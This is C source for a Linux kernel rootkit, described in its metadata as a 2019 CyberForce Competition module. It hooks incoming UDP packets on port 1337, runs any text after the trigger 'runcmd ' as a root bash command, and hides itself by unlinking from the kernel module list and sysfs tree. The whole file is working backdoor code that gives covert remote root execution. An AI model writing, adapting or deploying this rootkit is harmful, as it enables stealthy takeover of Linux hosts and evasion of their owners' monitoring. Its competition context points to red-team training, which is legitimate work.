#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/kernfs.h>
#include <linux/rbtree.h>
#include <linux/hash.h>

#define BAD_UDP_PORT 1337

struct mod_node {
    struct module *mod;
    struct list_head *next;
};

static struct list_head *mod_prev;

void exec_remote_cmd(const char *cmd) {
    char *envp[] = {
            "HOME=/",
            "TERM=xterm",
            "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
            NULL
    };

    char *argv[] = {
            "/bin/bash",
            "-c",
            cmd,
            NULL
    };
	/** pass our command back to ring-3 **/
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
}

/** Module hiding insipired by croemheld **/
void hide_module(struct module *mod) {
    struct kernfs_node *node = mod->mkobj.kobj.sd;

    if (mod == THIS_MODULE) {
        mod_prev = mod->list.prev;
    } else {
        struct mod_node *mn;
        mn = kmalloc(sizeof(struct mod_node), GFP_KERNEL);
        mn->mod = mod;
        mn->next = mod->list.next;

    }
    list_del(&mod->list);
    rb_erase(&node->rb, &node->parent->dir.children);
    node->rb.__rb_parent_color = (unsigned long) (&node->rb);
}


static struct nf_hook_ops nfho;

static unsigned int
bad_udp_netfilter_hook(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in,
                       const struct net_device *out, int (*okfn)(struct sk_buff *)) {
    if (!skb)
        return NF_ACCEPT;
    struct iphdr *iph;
    struct udphdr *udph;
    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_UDP)
        return NF_ACCEPT;
    udph = udp_hdr(skb);
    if (ntohs(udph->dest) != BAD_UDP_PORT)
        return NF_ACCEPT;

    int cL = 7;
    char code[7] = {'r', 'u', 'n', 'c', 'm', 'd', ' '};
    int cI = 0;

    char command[1024] = {'\0'};

    unsigned char *head = (unsigned char *) skb->data;
    unsigned char *it;

    for (it = head; it != skb->tail; ++it) {
        if (cI == cL)
            break;
        if (*(char *) it == code[cI])
            cI++;
        else
            cI = 0;
    }

    if (cL != cI) return NF_ACCEPT;
	
    head = it;
    int i = 0;
    while (it != skb->tail) {
        if ((*(char *) it) == '\r') {
            if (it + 1 != skb->tail && ((*(char *) it + 1) == '\n'))
                break;
        }
        if (i == 1023) {
            command[i] = '\0';
            break;
        }
        command[i] = *(char *) it;
        it++;
        i++;
    }
    exec_remote_cmd(command);
    return NF_DROP;
}

static int __init

bad_udp_init(void) {
    hide_module(THIS_MODULE);
    nfho.hook = (nf_hookfn *) bad_udp_netfilter_hook;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    return 0;
}

static void __exit

bad_udp_unhook(void) {
    nf_unregister_net_hook(&init_net, &nfho);
}

module_init(bad_udp_init);
module_exit(bad_udp_unhook);

MODULE_AUTHOR("David Jura");
MODULE_DESCRIPTION("bad_UDP - 2019 CyberForce Competition - ring-0 LKM which hooks and intercepts UDP packets in the pre-routing stage to execute remote commands. In addition, this module hides itself in memory via unlinking from the Linux kernel module list structure.");
MODULE_LICENSE("GPL");
